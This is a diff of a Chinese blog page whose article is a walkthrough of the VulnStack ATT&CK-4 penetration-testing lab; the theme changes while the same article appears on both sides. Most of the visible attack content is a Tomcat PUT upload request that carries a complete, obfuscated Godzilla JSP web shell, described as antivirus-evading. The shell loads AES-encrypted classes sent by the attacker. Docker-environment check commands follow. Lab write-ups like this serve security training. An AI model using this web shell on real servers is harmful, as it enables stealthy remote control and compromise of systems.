@@ -1,14 +1,170 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="VulnStack-ATT&amp;CK-4"><meta name="keywords" content=""><meta name="author" content="山野人"><meta name="copyright" content="山野人"><title>VulnStack-ATT&amp;CK-4 | 山野人</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  hexoVersion: '7.1.1'
-} </script><meta name="generator" content="Hexo 7.1.1"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0GetShell"><span class="toc-number">1.</span> <span class="toc-text">Tomcat漏洞文件上传GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">Docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BADocker%E7%8E%AF%E5%A2%83"><span class="toc-number">2.0.1.</span> <span class="toc-text">判断是否为Docker环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">2.0.2.</span> <span class="toc-text">特权模式逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90ssh-key"><span class="toc-number">2.0.3.</span> <span class="toc-text">生成ssh key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAkey-sh"><span class="toc-number">2.0.4.</span> <span class="toc-text">创建key.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%B8%8B%E8%BD%BDkey-sh"><span class="toc-number">2.0.5.</span> <span class="toc-text">靶机下载key.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.0.6.</span> <span class="toc-text">kali连接靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-number">2.0.7.</span> <span class="toc-text">注意</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">3.0.1.</span> <span class="toc-text">查网卡信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.0.2.</span> <span class="toc-text">内网主机探测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">配置代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-number">4.0.1.</span> <span class="toc-text">文件配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%9D%B6%E6%9C%BA"><span class="toc-number">4.0.2.</span> <span class="toc-text">上传到靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%8B%E4%BA%88%E6%9D%83%E9%99%90%E3%80%81%E5%90%AF%E5%8A%A8"><span class="toc-number">4.0.3.</span> <span class="toc-text">赋予权限、启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEproxychains"><span class="toc-number">4.0.4.</span> <span class="toc-text">配置proxychains</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">5.</span> <span class="toc-text">内网主机端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">MSF漏洞利用</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">山野人</div><div class="author-info__description text-center">日落山水静 为君起松声</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">11</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">山野人</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">VulnStack-ATT&amp;CK-4</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-09-21</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="Tomcat漏洞文件上传GetShell"><a href="#Tomcat漏洞文件上传GetShell" class="headerlink" title="Tomcat漏洞文件上传GetShell"></a>Tomcat漏洞文件上传GetShell</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">PUT /<span class="number">123.</span>jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.213</span><span class="number">.79</span>:<span class="number">2002</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: pma_lang=zh_CN</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Hello Administrator!Welcome To Tas9er Godzilla JSP Console!</span></span><br><span class="line"><span class="comment">&lt;%! String govsb_vCZ = &quot;32b9263ba0ca0ba6&quot;;</span></span><br><span class="line"><span class="comment">    String govsb_0QmkDfsJ5psCtWp = &quot;Tas9er&quot;;</span></span><br><span class="line"><span class="comment">    class govsb_noDGFwkx extends /*edusb_CK*/</span>ClassLoader &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">govsb_noDGFwkx</span><span class="params">(ClassLoader govsb_GW8L)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span><span class="comment">/*edusb_foLAvIJl7H*/</span>(govsb_GW8L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">govsb_oUujxt6dZb</span><span class="params">(<span class="type">byte</span>[] govsb_ZLjWwrnMQ8WJ)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.<span class="comment">/*edusb_xC6I*/</span>\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073<span class="comment">/*edusb_rX*/</span>(govsb_ZLjWwrnMQ8WJ, <span class="number">453996</span>-<span class="number">453996</span>, govsb_ZLjWwrnMQ8WJ.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] govsb_dm7oxpIMrl(<span class="type">byte</span>[] govsb_5UHPtWoPpPI, <span class="type">boolean</span> govsb_WKelMIzCo) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            j\u0061\u0076\u0061\u0078.<span class="comment">/*edusb_9DNef8*/</span>\u0063\u0072\u0079\u0070\u0074\u006f.<span class="type">Cipher</span> <span class="variable">govsb_yzXyPBECNrcB3</span> <span class="operator">=</span> j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e<span class="comment">/*edusb_X*/</span>(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            govsb_yzXyPBECNrcB3.init(govsb_WKelMIzCo?<span class="number">453996</span>/<span class="number">453996</span>:<span class="number">453996</span>/<span class="number">453996</span>+<span class="number">453996</span>/<span class="number">453996</span>,<span class="keyword">new</span> <span class="title class_">j</span>\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec.<span class="comment">/*edusb_Tt3m2UtTl0jLN*/</span>SecretKeySpec<span class="comment">/*edusb_b9u*/</span>(govsb_vCZ.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> govsb_yzXyPBECNrcB3.doFinal<span class="comment">/*edusb_khNNFOYB9k4V*/</span>(govsb_5UHPtWoPpPI);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    %&gt;&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] govsb_Tj = java.util.Base64.<span class="comment">/*edusb_YL2*/</span>\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072().<span class="comment">/*edusb_0OTvDhaXHk9RF*/</span>decode(request.getParameter(govsb_0QmkDfsJ5psCtWp));</span><br><span class="line">        govsb_Tj = govsb_dm7oxpIMrl(govsb_Tj,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute<span class="comment">/*edusb_4Bn56PL3BkOh*/</span>(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title class_">govsb_noDGFwkx</span>(<span class="built_in">this</span>.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().<span class="comment">/*edusb_C6*/</span>\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())<span class="comment">/*edusb_G0RppxudsG67h*/</span>.govsb_oUujxt6dZb(govsb_Tj));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>, govsb_Tj);</span><br><span class="line">            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">govsb_a3VDUBHR6zfJcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.<span class="comment">/*edusb_9tNMo34bHuc0vPG*/</span>ByteArrayOutputStream();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">govsb_AFha</span> <span class="operator">=</span> <span class="comment">/*edusb_LBLfux0y0vOg4c2*/</span>((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).<span class="comment">/*edusb_Q*/</span><span class="comment">/*edusb_lixCuwItN9q7*/</span><span class="keyword">new</span>\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()<span class="comment">/*edusb_uizf4dHFCJZ*/</span>;</span><br><span class="line">            govsb_AFha.equals(govsb_a3VDUBHR6zfJcc);</span><br><span class="line">            govsb_AFha.equals(pageContext);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;1D4FBBC3B3161BE2992B5C5FDF4455CA&quot;</span>.substring(<span class="number">453996</span>-<span class="number">453996</span>, <span class="number">16</span>));</span><br><span class="line">            govsb_AFha.toString();</span><br><span class="line">            response.getWriter().write(java.util.Base64<span class="comment">/*edusb_K*/</span>.getEncoder()<span class="comment">/*edusb_hx*/</span>.encodeToString(govsb_dm7oxpIMrl(govsb_a3VDUBHR6zfJcc.toByteArray(),<span class="literal">true</span>)));</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;1D4FBBC3B3161BE2992B5C5FDF4455CA&quot;</span>.substring(<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="山野人" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="日落山水静 为君起松声" />
+  
+  
+  
+  <title>
+    
+      VulnStack-ATT&amp;CK-4 
+      
+      
+      |
+    
+     山野人
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">VulnStack-ATT&CK-4</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-09-21 16:46:02
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="Tomcat漏洞文件上传GetShell"><a href="#Tomcat漏洞文件上传GetShell" class="headerlink" title="Tomcat漏洞文件上传GetShell"></a>Tomcat漏洞文件上传GetShell</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">PUT /<span class="number">123.</span>jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.213</span><span class="number">.79</span>:<span class="number">2002</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: pma_lang=zh_CN</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Hello Administrator!Welcome To Tas9er Godzilla JSP Console!</span></span><br><span class="line"><span class="comment">&lt;%! String govsb_vCZ = &quot;32b9263ba0ca0ba6&quot;;</span></span><br><span class="line"><span class="comment">    String govsb_0QmkDfsJ5psCtWp = &quot;Tas9er&quot;;</span></span><br><span class="line"><span class="comment">    class govsb_noDGFwkx extends /*edusb_CK*/</span>ClassLoader &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">govsb_noDGFwkx</span><span class="params">(ClassLoader govsb_GW8L)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span><span class="comment">/*edusb_foLAvIJl7H*/</span>(govsb_GW8L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">govsb_oUujxt6dZb</span><span class="params">(<span class="type">byte</span>[] govsb_ZLjWwrnMQ8WJ)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.<span class="comment">/*edusb_xC6I*/</span>\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073<span class="comment">/*edusb_rX*/</span>(govsb_ZLjWwrnMQ8WJ, <span class="number">453996</span>-<span class="number">453996</span>, govsb_ZLjWwrnMQ8WJ.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] govsb_dm7oxpIMrl(<span class="type">byte</span>[] govsb_5UHPtWoPpPI, <span class="type">boolean</span> govsb_WKelMIzCo) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            j\u0061\u0076\u0061\u0078.<span class="comment">/*edusb_9DNef8*/</span>\u0063\u0072\u0079\u0070\u0074\u006f.<span class="type">Cipher</span> <span class="variable">govsb_yzXyPBECNrcB3</span> <span class="operator">=</span> j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e<span class="comment">/*edusb_X*/</span>(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            govsb_yzXyPBECNrcB3.init(govsb_WKelMIzCo?<span class="number">453996</span>/<span class="number">453996</span>:<span class="number">453996</span>/<span class="number">453996</span>+<span class="number">453996</span>/<span class="number">453996</span>,<span class="keyword">new</span> <span class="title class_">j</span>\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec.<span class="comment">/*edusb_Tt3m2UtTl0jLN*/</span>SecretKeySpec<span class="comment">/*edusb_b9u*/</span>(govsb_vCZ.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> govsb_yzXyPBECNrcB3.doFinal<span class="comment">/*edusb_khNNFOYB9k4V*/</span>(govsb_5UHPtWoPpPI);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    %&gt;&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] govsb_Tj = java.util.Base64.<span class="comment">/*edusb_YL2*/</span>\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072().<span class="comment">/*edusb_0OTvDhaXHk9RF*/</span>decode(request.getParameter(govsb_0QmkDfsJ5psCtWp));</span><br><span class="line">        govsb_Tj = govsb_dm7oxpIMrl(govsb_Tj,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute<span class="comment">/*edusb_4Bn56PL3BkOh*/</span>(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title class_">govsb_noDGFwkx</span>(<span class="built_in">this</span>.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().<span class="comment">/*edusb_C6*/</span>\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())<span class="comment">/*edusb_G0RppxudsG67h*/</span>.govsb_oUujxt6dZb(govsb_Tj));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>, govsb_Tj);</span><br><span class="line">            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">govsb_a3VDUBHR6zfJcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.<span class="comment">/*edusb_9tNMo34bHuc0vPG*/</span>ByteArrayOutputStream();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">govsb_AFha</span> <span class="operator">=</span> <span class="comment">/*edusb_LBLfux0y0vOg4c2*/</span>((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).<span class="comment">/*edusb_Q*/</span><span class="comment">/*edusb_lixCuwItN9q7*/</span><span class="keyword">new</span>\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()<span class="comment">/*edusb_uizf4dHFCJZ*/</span>;</span><br><span class="line">            govsb_AFha.equals(govsb_a3VDUBHR6zfJcc);</span><br><span class="line">            govsb_AFha.equals(pageContext);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;1D4FBBC3B3161BE2992B5C5FDF4455CA&quot;</span>.substring(<span class="number">453996</span>-<span class="number">453996</span>, <span class="number">16</span>));</span><br><span class="line">            govsb_AFha.toString();</span><br><span class="line">            response.getWriter().write(java.util.Base64<span class="comment">/*edusb_K*/</span>.getEncoder()<span class="comment">/*edusb_hx*/</span>.encodeToString(govsb_dm7oxpIMrl(govsb_a3VDUBHR6zfJcc.toByteArray(),<span class="literal">true</span>)));</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;1D4FBBC3B3161BE2992B5C5FDF4455CA&quot;</span>.substring(<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <p>Tomcat是java环境，用jsp免杀码</p>
 <h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><h4 id="判断是否为Docker环境"><a href="#判断是否为Docker环境" class="headerlink" title="判断是否为Docker环境"></a>判断是否为Docker环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /.dockerenv</span><br><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
@@ -93,28 +249,350 @@
 <p>但是一到shell就卡死，导致进程被杀，更换kali还是不行，暂时放弃</p>
 <p>24.9.20</p>
 <p>END</p>
-</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">山野人</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://lxy00.top/2024/09/21/VulnStack-ATT&amp;CK-4/">http://lxy00.top/2024/09/21/VulnStack-ATT&amp;CK-4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lxy00.top">山野人</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2024/09/21/VulnStack-ATT&amp;CK-5/"><i class="fa fa-chevron-left">  </i><span>VulnStack-ATT&amp;CK-5</span></a></div><div class="next-post pull-right"><a href="/2024/09/21/VulnStack-ATT&amp;CK-3/"><span>VulnStack-ATT&amp;CK-3</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
-var verify = 'false' == 'true';
-var record_ip = 'false' == 'true';
-var GUEST_INFO = ['nick','mail','link'];
-var guest_info = 'nick,mail,link'.split(',').filter(function(item){
-  return GUEST_INFO.indexOf(item) > -1
-});
-guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
-window.valine = new Valine({
-  el:'#vcomment',
-  notify:notify,
-  verify:verify,
-  recordIP:record_ip,
